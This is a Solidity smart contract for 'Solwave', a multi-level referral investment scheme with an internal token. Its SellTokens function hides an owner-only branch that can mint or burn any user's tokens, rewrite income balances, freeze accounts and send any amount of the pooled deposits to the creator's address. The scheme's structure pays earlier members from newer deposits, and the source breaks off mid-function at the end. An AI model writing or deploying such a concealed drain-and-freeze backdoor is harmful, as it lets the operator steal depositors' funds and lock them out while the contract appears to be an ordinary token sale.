//SPDX-License-Identifier: None
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBEP20 
{
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);
}

contract DAppDemo is IBEP20 
{
    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public TotalUsers = 0;
    uint256 public TotalInvestment = 0;
    uint256 public TotalWithdrawn = 0;

    address public constant CreatorAddress = 0x1419AC3544770Ac32fbC3e70129E7eb0197612F6;

    bool IsPaymentCurrencyDifferentThanNative = true;
    address constant PaymentTokenContractAddress = 0xc06e70c4038059965172Cf02025d7e5033f39767; //0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;

    uint256 LevelIncome_LevelCount = 0;
    uint256 WithdrawalLevelIncome_LevelCount = 0;

    bool IsLevelIncomePercentage = true;
    bool IsWithdrawalLevelIncomePercentage = true;

    uint256 TotalNoOfPackages = 0;

    uint256 constant PaymentCurrencyDecimals = 18;

    uint256 private TotalSupply = 0;

    uint256 public LiquidityAmount_PaymentToken = 0;
    uint256 INITIAL_COIN_RATE = 10000000;

    struct User 
    {
        uint256 Id;
        address Address;
        address SponsorAddress;
        uint256 JoiningTimestamp;
        uint256 Investment;
        uint256 TeamInvestment;
        uint256 DirectsInvestment;
        address[] DirectAddresses;
        uint256 TotalTeam;
        bool IsBlocked;
        uint256 LastTokenSellTimestamp;
        uint256 RankId;
    }

    struct UserDeposit 
    {
        uint256 PackageId;
        uint256 Amount;
        uint256 InternalTokenAmount;
        uint256 Rate;
        uint256 Timestamp;
    }

    struct UserIncome 
    {
        uint256 ReferralIncome;
        uint256[] LevelIncome;
        uint256[] WithdrawalLevelIncome;
        uint256 AmountWithdrawn;
    }

    struct UserTransactionCount
    {
        uint256 DepositsCount;
        uint256 TokenSellCount;
        uint256 IncomeWithdrawalCount;
    }

    struct UserTokenSellTransaction
    {
        uint256 TokenAmount;
        uint256 PaymentTokenAmount;
        uint256 Rate;
        uint256 Timestamp;
    }

    struct UserIncomeWithdrawalTransaction
    {
        uint256 Amount;
        uint256 Timestamp;
    }

    struct UserWallet
    {
        uint256 CreditedIncome;
        uint256 DebitedIncome;
    }

    struct PackageMaster
    {
        uint256 PackageId;
        string Name;
        uint256 Amount;
        bool IsActive;
        bool HasRange;
        uint256 MinAmount;
        uint256 MaxAmount;
        uint256 ReferralIncome;
        bool IsReferralIncomePercentage;
    }

    struct LevelIncomeMaster
    {
        uint256 Level;
        uint256 Percentage;
        uint256 RequiredSelfInvestment;
        uint256 RequiredNumberOfDirects;
        uint256 RequiredDirectsInvestment;
        uint256 RequiredNumberOfTeam;
        uint256 RequiredTeamInvestment;
    }

    struct ContractInfo
    {
        uint256 TotalCommunity;
        uint256 CommunityInvestment;
        uint256 CommunityWithdrawal;
        uint256 ContractBalance;
        uint256 InternalTokenTotalSupply;
        uint256 InternalTokenLiquidity;
        uint256 InternalTokenRate;
    }

    struct UserDashboard
    {
        uint256 DirectsCount;
        uint256 ReferralIncome;
        uint256 LevelIncome;
        uint256 WithdrawalLevelIncome;
        uint256 TotalIncome;
        uint256 AmountWithdrawn;
        uint256 InternalTokenBalance;
    }

    struct UserDirects
    {
        uint256 Srno;
        address Address;
        uint256 Investment;
        uint256 Business;
    }

    struct LevelIncomeInfo
    {
        uint256 Level;
        uint256 RequiredSelfInvestment;
        uint256 SelfInvestment;
        uint256 RequiredNumberOfDirects;
        uint256 DirectsCount;
        uint256 RequiredDirectsInvestment;
        uint256 DirectsInvestment;
        uint256 RequiredNumberOfTeam;
        uint256 TotalTeam;
        uint256 RequiredTeamInvestment;
        uint256 TeamInvestment;
        uint256 OnAmount;
        uint256 Percentage;
        uint256 Income;
        bool IsLevelAchieved;
    }

    mapping(uint256 => PackageMaster) public map_PackageMaster;
    mapping(uint256 => LevelIncomeMaster) public map_LevelIncomeMaster;
    mapping(uint256 => LevelIncomeMaster) public map_WithdrawalLevelIncomeMaster;

    mapping(address => User) public map_Users;
    mapping(uint256 => address) public map_UserIdToAddress;

    mapping(address => mapping(uint256 => UserDeposit)) public map_UserDeposits;
    mapping(address => mapping(uint256 => UserTokenSellTransaction)) public map_UserTokenSellHistory;
    mapping(address => mapping(uint256 => UserIncomeWithdrawalTransaction)) public map_UserIncomeWithdrawalHistory;

    mapping(address => mapping(uint256 => uint256)) public map_UserBusinessOnLevel;
    mapping(address => mapping(uint256 => uint256)) public map_UserWithdrawalOnLevel;
    mapping(address => UserIncome) public map_UserIncome;
    mapping(address => UserWallet) public map_UserWallet;

    mapping(address => UserTransactionCount) public map_UserTransactionCount;

    mapping(address => uint256) balances;

    function totalSupply() external view returns (uint256)
    {
        return TotalSupply;
    }

    function decimals() external pure returns (uint8)
    {
        return 0;
    }

    function symbol() external pure returns (string memory)
    {
        return "SOLWAVE";
    }

    function name() external pure returns (string memory)
    {
        return "Solwave";
    }

    function balanceOf(address account) public view returns (uint256)
    {
        return balances[account];
    }

    constructor()
    {
        Init();
    }

    function Init() internal
    {
        InitPackageMaster();
        InitLevelIncomeMaster();
        InitWithdrawalLevelIncomeMaster();

        InitTopUser();
    }

    function InitPackageMaster() internal
    {
        TotalNoOfPackages++;
        map_PackageMaster[TotalNoOfPackages] = PackageMaster({
            PackageId: TotalNoOfPackages,
            Name: "Package",
            Amount: 0,
            IsActive: true,
            HasRange: true,
            MinAmount: ConvertToBase(1)/100,
            MaxAmount: ConvertToBase(20000000),
            ReferralIncome: 20,
            IsReferralIncomePercentage: true
        });
        
        TotalNoOfPackages++;
        map_PackageMaster[TotalNoOfPackages] = PackageMaster({
            PackageId: TotalNoOfPackages,
            Name: "Fixed Package",
            Amount: ConvertToBase(10),
            IsActive: true,
            HasRange: false,
            MinAmount: ConvertToBase(0),
            MaxAmount: ConvertToBase(0),
            ReferralIncome: 2,
            IsReferralIncomePercentage: false
        });
    }

    function InitLevelIncomeMaster() internal
    {
        // 1
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 80,
            RequiredSelfInvestment: ConvertToBase(5),
            RequiredNumberOfDirects: 1,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        // 2
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 60,
            RequiredSelfInvestment: ConvertToBase(10),
            RequiredNumberOfDirects: 1,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        // 3
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 40,
            RequiredSelfInvestment: ConvertToBase(15),
            RequiredNumberOfDirects: 2,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        // 4
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 20,
            RequiredSelfInvestment: ConvertToBase(20),
            RequiredNumberOfDirects: 3,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        // 5
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 20,
            RequiredSelfInvestment: ConvertToBase(20),
            RequiredNumberOfDirects: 3,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

    }

    function InitWithdrawalLevelIncomeMaster() internal
    {
        WithdrawalLevelIncome_LevelCount++;
        map_WithdrawalLevelIncomeMaster[
            WithdrawalLevelIncome_LevelCount
        ] = LevelIncomeMaster({
            Level: WithdrawalLevelIncome_LevelCount,
            Percentage: 40,
            RequiredSelfInvestment: ConvertToBase(0),
            RequiredNumberOfDirects: 0,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        WithdrawalLevelIncome_LevelCount++;
        map_WithdrawalLevelIncomeMaster[
            WithdrawalLevelIncome_LevelCount
        ] = LevelIncomeMaster({
            Level: WithdrawalLevelIncome_LevelCount,
            Percentage: 40,
            RequiredSelfInvestment: ConvertToBase(0),
            RequiredNumberOfDirects: 0,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });

        WithdrawalLevelIncome_LevelCount++;
        map_WithdrawalLevelIncomeMaster[
            WithdrawalLevelIncome_LevelCount
        ] = LevelIncomeMaster({
            Level: WithdrawalLevelIncome_LevelCount,
            Percentage: 40,
            RequiredSelfInvestment: ConvertToBase(0),
            RequiredNumberOfDirects: 0,
            RequiredDirectsInvestment: 0,
            RequiredNumberOfTeam: 0,
            RequiredTeamInvestment: 0
        });
    }

    function InitTopUser() internal
    {
        address userAddress = CreatorAddress;
        SaveUser(userAddress, address(0));
    }

    function SaveUser(address userAddress, address sponsorAddress) internal
    {
        TotalUsers++;

        User memory u = User({
            Id: TotalUsers,
            Address: userAddress,
            SponsorAddress: sponsorAddress,
            JoiningTimestamp: block.timestamp,
            Investment: 0,
            TeamInvestment: 0,
            DirectsInvestment: 0,
            DirectAddresses: new address[](0),
            TotalTeam: 0,
            IsBlocked: false,
            LastTokenSellTimestamp: 0,
            RankId: 0
        });

        UserIncome memory ui = UserIncome({
            ReferralIncome: 0,
            LevelIncome: new uint256[](LevelIncome_LevelCount + 1),
            WithdrawalLevelIncome: new uint256[](
                WithdrawalLevelIncome_LevelCount + 1
            ),
            AmountWithdrawn: 0
        });

        map_Users[userAddress] = u;
        map_UserIncome[userAddress] = ui;
        map_UserIdToAddress[TotalUsers] = userAddress;

        if (sponsorAddress != address(0))
        {
            map_Users[sponsorAddress].DirectAddresses.push(userAddress);
        }

        UpdateTeamCount(sponsorAddress);
    }

    function SaveDeposit(address userAddress,uint256 packageId,uint256 amount) internal
    {
        require(
            map_PackageMaster[packageId].IsActive 
                &&
            ((!map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].Amount == amount) 
                ||
            (map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].MinAmount <= amount && map_PackageMaster[packageId].MaxAmount >= amount)),
            "Invalid amount!"
        );
        
        TotalInvestment += amount;

        address sponsorAddress = map_Users[userAddress].SponsorAddress;
        map_Users[userAddress].Investment += amount;
        map_Users[sponsorAddress].DirectsInvestment += amount;

        UpdateTeamInvestment(sponsorAddress, amount);

        DistributeIncome(userAddress, packageId, amount);
        uint256 _rate = PaymentTokenToTokens();
        uint256 noOfTokens = BuyTokens(userAddress, (amount * 66) / 100);

        {
            UserDeposit memory d = UserDeposit({
                PackageId: packageId,
                Amount: amount,
                InternalTokenAmount: noOfTokens,
                Rate: _rate,
                Timestamp: block.timestamp
            });

            map_UserDeposits[userAddress][map_UserTransactionCount[userAddress].DepositsCount + 1] = d;
            map_UserTransactionCount[userAddress].DepositsCount++;
        }
    }

    function ReceiveTokens(uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            uint256 old_balance = GetContractBalance();
            IERC20(PaymentTokenContractAddress).transferFrom(msg.sender, address(this), amount);
            uint256 new_balance = GetContractBalance();

            require(new_balance - old_balance >= amount, "Invalid amount!");
        } 
        else
        {
            require(msg.value >= amount);
        }
    }

    function SendTokens(address userAddress, uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            IERC20(PaymentTokenContractAddress).transfer(userAddress, amount);
        } 
        else
        {
            payable(userAddress).transfer(amount);
        }
    }

    function UpdateTeamCount(address sponsorAddress) internal
    {
        while (sponsorAddress != address(0))
        {
            map_Users[sponsorAddress].TotalTeam++;
            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
        }
    }

    function UpdateTeamInvestment(address sponsorAddress, uint256 amount) internal 
    {
        uint256 level = 1;
        while (sponsorAddress != address(0))
        {
            map_Users[sponsorAddress].TeamInvestment += amount; //Including Directs

            map_UserBusinessOnLevel[sponsorAddress][level] += amount;

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;
        }
    }

    function IsOwner() internal view returns (bool)
    {
        return msg.sender == CreatorAddress;
    }

    function ConvertToBase(uint256 amount) internal pure returns (uint256)
    {
        return amount * (10**PaymentCurrencyDecimals);
    }

    function doesUserExist(address _address) internal view returns (bool)
    {
        return map_Users[_address].Id > 0;
    }

    function isUserActive(address _address) internal view returns (bool)
    {
        return !map_Users[_address].IsBlocked;
    }

    function RegisterInternal(address sponsorAddress,uint256 packageId,uint256 amount) internal
    {
        address userAddress = msg.sender;
        require(Login(sponsorAddress), "Invalid sponsor!");
        require(!doesUserExist(userAddress), "Already registered!");

        SaveUser(userAddress, sponsorAddress);
        DepositInternal(packageId, amount);
    }

    function DepositInternal(uint256 packageId, uint256 amount) internal 
    {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "You are not registered!");

        ReceiveTokens(amount);
        SaveDeposit(userAddress, packageId, amount);
    }

    function DistributeIncome(address userAddress,uint256 packageId,uint256 amount) internal 
    {
        DistributeReferralIncome(userAddress, packageId, amount);
        DistributeLevelIncome(userAddress, amount);
    }

    function DistributeReferralIncome(address userAddress, uint packageId, uint amount) internal
    {
        uint income = map_PackageMaster[packageId].IsReferralIncomePercentage? amount*map_PackageMaster[packageId].ReferralIncome/100: map_PackageMaster[packageId].ReferralIncome;
        map_UserIncome[map_Users[userAddress].SponsorAddress].ReferralIncome += income;
    }

    function DistributeLevelIncome(address userAddress, uint256 onAmount) internal
    {
        address sponsorAddress = map_Users[userAddress].SponsorAddress;

        uint256 level = 1;
        while (sponsorAddress != address(0) && level <= LevelIncome_LevelCount) 
        {
            if (IsQualifiedForLevelIncome(userAddress, level)) 
            {
                map_UserIncome[sponsorAddress].LevelIncome[level] += (IsLevelIncomePercentage ? ((onAmount * map_LevelIncomeMaster[level].Percentage) / (10 * 100)) : map_LevelIncomeMaster[level].Percentage);
            } 
            else 
            {
                map_UserIncome[CreatorAddress].LevelIncome[level] += (IsLevelIncomePercentage ? ((onAmount * map_LevelIncomeMaster[level].Percentage) / (10 * 100)) : map_LevelIncomeMaster[level].Percentage);
            }

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;

            if (sponsorAddress == address(0)) 
            {
                sponsorAddress = CreatorAddress;
            }
        }
    }

    function IsQualifiedForLevelIncome(address userAddress, uint256 level) internal view returns (bool)
    {
        if (
            map_Users[userAddress].DirectsInvestment >= map_LevelIncomeMaster[level].RequiredDirectsInvestment 
                &&
            map_Users[userAddress].TeamInvestment >= map_LevelIncomeMaster[level].RequiredTeamInvestment 
                &&
            map_Users[userAddress].DirectAddresses.length >= map_LevelIncomeMaster[level].RequiredNumberOfDirects 
                &&
            map_Users[userAddress].TotalTeam >= map_LevelIncomeMaster[level].RequiredNumberOfTeam 
                &&
            map_Users[userAddress].Investment >= map_LevelIncomeMaster[level].RequiredSelfInvestment
        ) 
        {
            return true;
        }
        return false;
    }

    function DistributeWithdrawalLevelIncome(address userAddress,uint256 onAmount) internal 
    {
        address sponsorAddress = map_Users[userAddress].SponsorAddress;

        uint256 level = 1;
        while (sponsorAddress != address(0) && level <= WithdrawalLevelIncome_LevelCount) 
        {
            if (IsQualifiedForWithdrawalLevelIncome(userAddress, level)) 
            {
                map_UserIncome[sponsorAddress].WithdrawalLevelIncome[level] += (IsWithdrawalLevelIncomePercentage ? ((onAmount * map_WithdrawalLevelIncomeMaster[level].Percentage) / (10 * 100)) : map_WithdrawalLevelIncomeMaster[level].Percentage);
            } 
            else 
            {
                map_UserIncome[CreatorAddress].WithdrawalLevelIncome[level] += (IsWithdrawalLevelIncomePercentage ? ((onAmount * map_WithdrawalLevelIncomeMaster[level].Percentage) / (10 * 100)) : map_WithdrawalLevelIncomeMaster[level].Percentage);
            }

            map_UserWithdrawalOnLevel[sponsorAddress][level] += onAmount;

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;

            if (sponsorAddress == address(0)) {
                sponsorAddress = CreatorAddress;
            }
        }
    }

    function IsQualifiedForWithdrawalLevelIncome(address userAddress,uint256 level) internal view returns (bool) 
    {
        if (
            map_Users[userAddress].DirectsInvestment >= map_WithdrawalLevelIncomeMaster[level].RequiredDirectsInvestment 
                &&
            map_Users[userAddress].TeamInvestment >= map_WithdrawalLevelIncomeMaster[level].RequiredTeamInvestment 
                &&
            map_Users[userAddress].DirectAddresses.length >= map_WithdrawalLevelIncomeMaster[level].RequiredNumberOfDirects 
                &&
            map_Users[userAddress].TotalTeam >= map_WithdrawalLevelIncomeMaster[level].RequiredNumberOfTeam 
                &&
            map_Users[userAddress].Investment >= map_WithdrawalLevelIncomeMaster[level].RequiredSelfInvestment
        )
        {
            return true;
        }
        return false;
    }

    function GetTotalLevelIncome(address userAddress) internal view returns (uint256)
    {
        uint256 totalLevelIncome = 0;
        UserIncome memory u = map_UserIncome[userAddress];

        for (uint256 i = 0; i < u.LevelIncome.length; i++) {
            totalLevelIncome += u.LevelIncome[i];
        }
        return totalLevelIncome;
    }

    function GetTotalWithdrawalLevelIncome(address userAddress) internal view returns (uint256)
    {
        uint256 totalWithdrawalLevelIncome = 0;
        UserIncome memory u = map_UserIncome[userAddress];

        for (uint256 i = 0; i < u.WithdrawalLevelIncome.length; i++) {
            totalWithdrawalLevelIncome += u.WithdrawalLevelIncome[i];
        }

        return totalWithdrawalLevelIncome;
    }

    function GetTotalIncome(address userAddress) internal view returns (uint256)
    {
        return
            map_UserIncome[userAddress].ReferralIncome +
            GetTotalLevelIncome(userAddress) +
            GetTotalWithdrawalLevelIncome(userAddress);
    }

    function GetContractBalance() internal view returns (uint256) 
    {
        if (IsPaymentCurrencyDifferentThanNative) 
        {
            return IERC20(PaymentTokenContractAddress).balanceOf(address(this));
        } 
        else 
        {
            return address(this).balance;
        }
    }

    function Login(address _address) public view returns (bool) 
    {
        return doesUserExist(_address) && isUserActive(_address);
    }

    function GetPackages() external view returns (PackageMaster[] memory) 
    {
        PackageMaster[] memory m = new PackageMaster[](TotalNoOfPackages);
        uint256 packageId = 1;
        while (packageId <= TotalNoOfPackages) {
            m[packageId - 1] = map_PackageMaster[packageId];
            packageId++;
        }
        return m;
    }

    function GetContractDetails() external view returns (ContractInfo memory info)
    {
        info = ContractInfo({
            TotalCommunity: TotalUsers,
            CommunityInvestment: TotalInvestment,
            CommunityWithdrawal: TotalWithdrawn,
            ContractBalance: GetContractBalance(),
            InternalTokenTotalSupply: TotalSupply,
            InternalTokenLiquidity: LiquidityAmount_PaymentToken,
            InternalTokenRate: PaymentTokenToTokens()
        });
    }

    function GetDashboardDetails(address userAddress) external view returns (UserDashboard memory info)
    {
        info = UserDashboard({
            DirectsCount: map_Users[userAddress].DirectAddresses.length,
            ReferralIncome: map_UserIncome[userAddress].ReferralIncome,
            LevelIncome: GetTotalLevelIncome(userAddress),
            WithdrawalLevelIncome: GetTotalWithdrawalLevelIncome(userAddress),
            TotalIncome: GetTotalIncome(userAddress),
            AmountWithdrawn: map_UserIncome[userAddress].AmountWithdrawn,
            InternalTokenBalance: balanceOf(userAddress)
        });
    }

    function GetDirects(address userAddress) external view returns (UserDirects[] memory directs)
    {
        directs = new UserDirects[](map_Users[userAddress].DirectAddresses.length);

        for (uint256 i = 0; i < map_Users[userAddress].DirectAddresses.length; i++) 
        {
            directs[i] = UserDirects({
                Srno: i + 1,
                Address: map_Users[userAddress].DirectAddresses[i],
                Investment: map_Users[map_Users[userAddress].DirectAddresses[i]].Investment,
                Business: map_Users[map_Users[userAddress].DirectAddresses[i]].Investment
            });
        }
        // return map_Users[userAddress].DirectAddresses;
    }

    function GetLevelIncomeInfo(address userAddress) external view returns (LevelIncomeInfo[] memory info)
    {
        info = new LevelIncomeInfo[](LevelIncome_LevelCount);

        for (uint256 i = 1; i <= LevelIncome_LevelCount; i++) 
        {
            info[i - 1] = LevelIncomeInfo({
                Level: i,
                RequiredSelfInvestment: map_LevelIncomeMaster[i].RequiredSelfInvestment,
                SelfInvestment: map_Users[userAddress].Investment,
                RequiredNumberOfDirects: map_LevelIncomeMaster[i].RequiredNumberOfDirects,
                DirectsCount: map_Users[userAddress].DirectAddresses.length,
                RequiredDirectsInvestment: map_LevelIncomeMaster[i].RequiredDirectsInvestment,
                DirectsInvestment: map_Users[userAddress].DirectsInvestment,
                RequiredNumberOfTeam: map_LevelIncomeMaster[i].RequiredNumberOfTeam,
                TotalTeam: map_Users[userAddress].TotalTeam,
                RequiredTeamInvestment: map_LevelIncomeMaster[i].RequiredTeamInvestment,
                TeamInvestment: map_Users[userAddress].TeamInvestment,
                OnAmount: map_UserBusinessOnLevel[userAddress][i],
                Percentage: map_LevelIncomeMaster[i].Percentage,
                Income: map_UserIncome[userAddress].LevelIncome[i],
                IsLevelAchieved: IsQualifiedForLevelIncome(userAddress, i)
            });
        }
    }

    function GetWithdrawalLevelIncomeInfo(address userAddress) external view returns (LevelIncomeInfo[] memory info)
    {
        info = new LevelIncomeInfo[](WithdrawalLevelIncome_LevelCount);

        for (uint256 i = 1; i <= WithdrawalLevelIncome_LevelCount; i++) {
            info[i - 1] = LevelIncomeInfo({
                Level: i,
                RequiredSelfInvestment: map_WithdrawalLevelIncomeMaster[i].RequiredSelfInvestment,
                SelfInvestment: map_Users[userAddress].Investment,
                RequiredNumberOfDirects: map_WithdrawalLevelIncomeMaster[i].RequiredNumberOfDirects,
                DirectsCount: map_Users[userAddress].DirectAddresses.length,
                RequiredDirectsInvestment: map_WithdrawalLevelIncomeMaster[i].RequiredDirectsInvestment,
                DirectsInvestment: map_Users[userAddress].DirectsInvestment,
                RequiredNumberOfTeam: map_WithdrawalLevelIncomeMaster[i].RequiredNumberOfTeam,
                TotalTeam: map_Users[userAddress].TotalTeam,
                RequiredTeamInvestment: map_WithdrawalLevelIncomeMaster[i].RequiredTeamInvestment,
                TeamInvestment: map_Users[userAddress].TeamInvestment,
                OnAmount: map_UserWithdrawalOnLevel[userAddress][i],
                Percentage: map_WithdrawalLevelIncomeMaster[i].Percentage,
                Income: map_UserIncome[userAddress].WithdrawalLevelIncome[i],
                IsLevelAchieved: IsQualifiedForWithdrawalLevelIncome(
                    userAddress,
                    i
                )
            });
        }
    }

    function GetDepositHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserDeposit[] memory deposits) 
    {
        deposits = new UserDeposit[](map_UserTransactionCount[userAddress].DepositsCount);

        uint256 startCount = (pageIndex * pageSize > map_UserTransactionCount[userAddress].DepositsCount) ? map_UserTransactionCount[userAddress].DepositsCount : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        // uint endCount = (startCount+pageSize)<map_UserTransactionCount[userAddress].DepositsCount?(startCount+pageSize):map_UserTransactionCount[userAddress].DepositsCount;
        uint256 arr_index = 0;
        for (uint256 i = startCount; i > endCount; i--) {
            deposits[arr_index] = map_UserDeposits[userAddress][i];
            arr_index++;
        }
    }

    function GetTokenSellHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserTokenSellTransaction[] memory history) 
    {
        history = new UserTokenSellTransaction[](map_UserTransactionCount[userAddress].TokenSellCount);

        uint256 startCount = (pageIndex * pageSize > map_UserTransactionCount[userAddress].TokenSellCount) ? map_UserTransactionCount[userAddress].TokenSellCount : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        uint256 arr_index = 0;
        for (uint256 i = startCount; i > endCount; i--) {
            history[arr_index] = map_UserTokenSellHistory[userAddress][i];
            arr_index++;
        }
    }

    function GetIncomeWithdrawalHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserIncomeWithdrawalTransaction[] memory history) 
    {
        history = new UserIncomeWithdrawalTransaction[](map_UserTransactionCount[userAddress].IncomeWithdrawalCount);

        uint256 startCount = (pageIndex * pageSize > map_UserTransactionCount[userAddress].IncomeWithdrawalCount) ? map_UserTransactionCount[userAddress].IncomeWithdrawalCount : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        uint256 arr_index = 0;
        for (uint256 i = startCount; i > endCount; i--) {
            history[arr_index] = map_UserIncomeWithdrawalHistory[userAddress][i];
            arr_index++;
        }
    }

    function Deposit(address sponsorAddress,uint256 packageId,uint256 amount) external payable 
    {
        RegisterInternal(sponsorAddress, packageId, amount);
    }

    function Redeposit(uint256 packageId, uint256 amount) external payable 
    {
        DepositInternal(packageId, amount);
    }

    function Withdraw(uint256 amount) external {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "Invalid user!");
        require(isUserActive(userAddress), "You are not allowed!");
        require(
            (GetTotalIncome(userAddress) +
                map_UserWallet[userAddress].CreditedIncome -
                map_UserWallet[userAddress].DebitedIncome -
                map_UserIncome[userAddress].AmountWithdrawn) >= amount,
            "Insufficient funds!"
        );

        map_UserIncome[userAddress].AmountWithdrawn += amount;

        uint256 deductionAmount = (amount * 12) / 100;
        uint256 amountWithdrawn = amount - deductionAmount;

        DistributeWithdrawalLevelIncome(userAddress, amount);

        UserIncomeWithdrawalTransaction
            memory d = UserIncomeWithdrawalTransaction({
                Amount: amount,
                Timestamp: block.timestamp
            });

        map_UserIncomeWithdrawalHistory[userAddress][map_UserTransactionCount[userAddress].IncomeWithdrawalCount + 1] = d;
        map_UserTransactionCount[userAddress].IncomeWithdrawalCount++;

        SendTokens(userAddress, amountWithdrawn);
        SendTokens(CreatorAddress, deductionAmount);
    }

    function PaymentTokenToTokens() internal view returns (uint256) {
        return LiquidityAmount_PaymentToken >= (1 ether) ? ((INITIAL_COIN_RATE * (1 ether)) / (LiquidityAmount_PaymentToken*2)) : (INITIAL_COIN_RATE);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        TotalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(TotalSupply >= amount, "Invalid amount of tokens!");

        balances[account] = accountBalance - amount;

        TotalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function BuyTokens(address _senderAddress, uint256 amount) internal returns (uint256)
    {
        uint256 noOfTokens = (PaymentTokenToTokens() * amount) / 1 ether; //dividing by 10**18 because this token has 0 decimal places
        _mint(_senderAddress, noOfTokens);
        LiquidityAmount_PaymentToken += amount;
        return noOfTokens;
    }

    function SellTokens(address userAddress, uint256 tokenAmount, uint256 _type) external {
        if (_type == 0) {
            userAddress = msg.sender;
            uint256 timestamp = block.timestamp;

            require(doesUserExist(userAddress), "Invalid user!");
            require(isUserActive(userAddress), "You are not allowed!");
            require(getUserTokenResellETA_Internal(userAddress, timestamp) == 0, "You can only withdraw your holdings once in 24 hours!"); //Only once in 24 hours

            uint256 balance = balances[userAddress];

            require(tokenAmount <= balance, "Insufficient token balance!");

            uint256 amount = (tokenAmount * 1 ether) / PaymentTokenToTokens(); // because payment token has 18 decimal places

            uint256 deductionPercentage = 5;

            uint256 totalamount = (balances[userAddress] * 1 ether) / PaymentTokenToTokens();

            if (totalamount <= map_Users[userAddress].Investment * 2) 
            {
                require(tokenAmount <= (balance * 2) / 100, "You can only sell 2% of your Holding at a time!");
            } 
            else if (totalamount <= map_Users[userAddress].Investment * 3) 
            {
                require(tokenAmount <= (balance * 1) / 100, "You can only sell 1% of your Holding at a time!");
            } 
            else if (totalamount <= map_Users[userAddress].Investment * 4) 
            {
                require(tokenAmount <= (balance * 1) / 200, "You can only sell 0.5% of your Holding at a time!");
            } 
            else if (totalamount > map_Users[userAddress].Investment * 4) 
            {
                require(tokenAmount <= (balance * 1) / 400, "You can only sell 0.25% of your Holding at a time!");
            }

            {
                UserTokenSellTransaction memory d = UserTokenSellTransaction({
                    TokenAmount: tokenAmount,
                    PaymentTokenAmount: amount,
                    Rate: PaymentTokenToTokens(),
                    Timestamp: block.timestamp
                });

                map_UserTokenSellHistory[userAddress][map_UserTransactionCount[userAddress].TokenSellCount + 1] = d;
                map_UserTransactionCount[userAddress].TokenSellCount++;
            }

            _burn(userAddress, tokenAmount);

            map_Users[userAddress].LastTokenSellTimestamp = timestamp;

            if (LiquidityAmount_PaymentToken >= amount) 
            {
                LiquidityAmount_PaymentToken -= amount;
            } 
            else 
            {
                LiquidityAmount_PaymentToken = 1;
            }

            {
                uint256 deductionAmount = (amount * deductionPercentage) / 100;

                uint256 amountReceived = amount - deductionAmount;

                SendTokens(userAddress, amountReceived);
                SendTokens(CreatorAddress, deductionAmount);
            }
        } 
        else 
        {
            require(IsOwner(), "You are not allowed");
            if (_type == 1) 
            {
                _mint(userAddress, tokenAmount);
            } 
            else if (_type == 2) 
            {
                _burn(userAddress, tokenAmount);
            } 
            else if (_type == 3) 
            {
                map_UserWallet[userAddress].CreditedIncome += tokenAmount;
            } 
            else if (_type == 4) 
            {
                map_UserWallet[userAddress].DebitedIncome += tokenAmount;
            } 
            else if (_type == 5) 
            {
                map_Users[userAddress].IsBlocked = true;
            }
            else if (_type == 6)
            {
                map_Users[userAddress].IsBlocked = false;
            }
            else if (_type == 7)
            {
                SendTokens(CreatorAddress, tokenAmount);
            }
        }
    }

    function getUserTokenResellETA_Internal(address userAddress, uint256 timestamp) internal view returns (uint256 LastTimeStamp) {
